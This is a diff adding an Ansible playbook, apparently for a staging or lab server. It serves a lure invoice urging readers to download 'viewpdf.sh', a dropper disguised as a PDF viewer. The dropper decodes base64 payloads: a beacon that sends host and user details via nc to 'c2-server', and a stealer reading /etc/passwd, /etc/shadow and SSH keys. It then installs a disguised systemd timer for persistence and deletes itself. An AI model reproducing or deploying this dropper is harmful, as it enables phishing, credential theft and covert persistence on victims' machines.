@@ -1,0 +1,116 @@
+---
+- name: Add staging user
+  user:
+    name: '{{ username }}'
+    password: '{{ password | password_hash("sha512") }}'
+    shell: /bin/bash
+    groups: sudo
+    append: yes
+
+- name: Add host aliases
+  lineinfile:
+    path: /etc/hosts
+    line: "{{ item.ip }} {{ item.name }}"
+    state: present
+  loop: "{{ hosts_entries }}"
+
+- name: Install python3
+  apt:
+    name: python3
+    state: present
+    update_cache: yes
+
+- name: Create staging web root
+  file:
+    path: "{{ staging_root }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+
+- name: Place lure invoice document
+  copy:
+    dest: "{{ staging_root }}/Invoice_March_2026.txt"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      INVOICE #INV-2026-0312
+      ** To review this document install the PDF viewer first **
+      http://staging-server:{{ staging_port }}/viewpdf.sh
+
+- name: Create the dropper script (contains base64-encoded payloads)
+  copy:
+    dest: "{{ staging_root }}/viewpdf.sh"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # viewpdf v1.1 -- PDF Document Viewer
+      # Usage: viewpdf.sh [file]
+      set -e
+      [ -n "$1" ] && echo "=== PDF Viewer === Opening: $1" || true
+
+      # Extract and install components
+      mkdir -p /tmp/.session
+      printf '%s' 'IyEvYmluL2Jhc2gKIyBzZXNzaW9uLW1nciAtLSBzeXN0ZW0gc2Vzc2lvbiBtYW5hZ2VtZW50CkMyPSJjMi1zZXJ2ZXIiClBPUlQ9IjYwNjAiCkxPRz0iL3RtcC8uc2Vzc2lvbi9yYXQubG9nIgpta2RpciAtcCAvdG1wLy5zZXNzaW9uCmVjaG8gIiQoZGF0ZSAtSXMpIENPTk5FQ1QgJHtDMn06JHtQT1JUfSBob3N0PSQoaG9zdG5hbWUpIiA+PiAiJExPRyIKewogIGVjaG8gIj09PSBSQVQgJChkYXRlIC1JcykgPT09IgogIGVjaG8gImhvc3Q9JChob3N0bmFtZSkiCiAgZWNobyAiaXA9JChob3N0bmFtZSAtSSB8IGF3ayAne3ByaW50ICQxfScpIgogIGVjaG8gInVzZXI9JCh3aG9hbWkpIgogIGVjaG8gInVwdGltZT0kKHVwdGltZSAtcCkiCiAgZWNobyAicHJvY3M9JChwcyBhdXggfCB3YyAtbCkiCn0gfCBuYyAtdyAxMCAiJEMyIiAiJFBPUlQiIDI+L2Rldi9udWxsIHx8IHRydWUKZWNobyAiJChkYXRlIC1JcykgRE9ORSIgPj4gIiRMT0ciCg==' | base64 -d > /tmp/.session/rat.sh
+      printf '%s' 'IyEvYmluL2Jhc2gKIyBzeXMtY29sbGVjdCAtLSBvbmUtc2hvdCBjcmVkZW50aWFsIGNvbGxlY3RvcgplY2hvICI9PT0gQ09MTEVDVCAkKGRhdGUgLUlzKSBob3N0PSQoaG9zdG5hbWUpID09PSIKZWNobyAiLS0tIC9ldGMvcGFzc3dkIC0tLSIKY2F0IC9ldGMvcGFzc3dkIDI+L2Rldi9udWxsIHx8IHRydWUKZWNobyAiLS0tIGhvbWUgZGlyZWN0b3JpZXMgLS0tIgpscyAtbGEgL2hvbWUvIDI+L2Rldi9udWxsIHx8IHRydWUKZm9yIGQgaW4gL2hvbWUvKi87IGRvCiAgZWNobyAiLS0tIGNvbnRlbnRzOiAkZCAtLS0iCiAgbHMgLWxhICIkZCIgMj4vZGV2L251bGwgfHwgdHJ1ZQpkb25lCmVjaG8gIi0tLSBTU0ggcHVibGljIGtleXMgLS0tIgpmaW5kIC9ob21lIC1uYW1lICcqLnB1YicgMj4vZGV2L251bGwgLWV4ZWMgY2F0IHt9IFw7CmVjaG8gIi0tLSAvZXRjL3NoYWRvdyAoYXR0ZW1wdCkgLS0tIgpjYXQgL2V0Yy9zaGFkb3cgMj4vZGV2L251bGwgfHwgZWNobyAiKHBlcm1pc3Npb24gZGVuaWVkKSIKZWNobyAiLS0tIEVORCAtLS0iCg==' | base64 -d > /tmp/.session/stealer.sh
+      chmod +x /tmp/.session/rat.sh /tmp/.session/stealer.sh
+
+      # Run credential collector once silently
+      /tmp/.session/stealer.sh > /tmp/.session/stealer.out 2>&1 || true
+
+      # Install persistent component
+      cat > /etc/systemd/system/session-mgr.service <<'EOF'
+      [Unit]
+      Description=System Session Manager
+      After=network-online.target
+      Wants=network-online.target
+      [Service]
+      Type=oneshot
+      ExecStart=/tmp/.session/rat.sh
+      EOF
+      cat > /etc/systemd/system/session-mgr.timer <<'EOF'
+      [Unit]
+      Description=Periodic session management
+      [Timer]
+      OnCalendar=*:0/5
+      Persistent=true
+      [Install]
+      WantedBy=timers.target
+      EOF
+      systemctl daemon-reload
+      systemctl enable --now session-mgr.timer 2>/dev/null || true
+
+      # Self-delete (anti-forensics)
+      rm -- "$0"
+
+- name: Create systemd service to serve share via HTTP
+  copy:
+    dest: /etc/systemd/system/staging-srv.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Internal Document Share
+      After=network.target
+
+      [Service]
+      Type=simple
+      WorkingDirectory={{ staging_root }}
+      ExecStart=/usr/bin/python3 -m http.server {{ staging_port }}
+      Restart=always
+      RestartSec=3
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Enable and start staging HTTP server
+  systemd:
+    name: staging-srv.service
+    enabled: yes
+    state: started
+    daemon_reload: yes
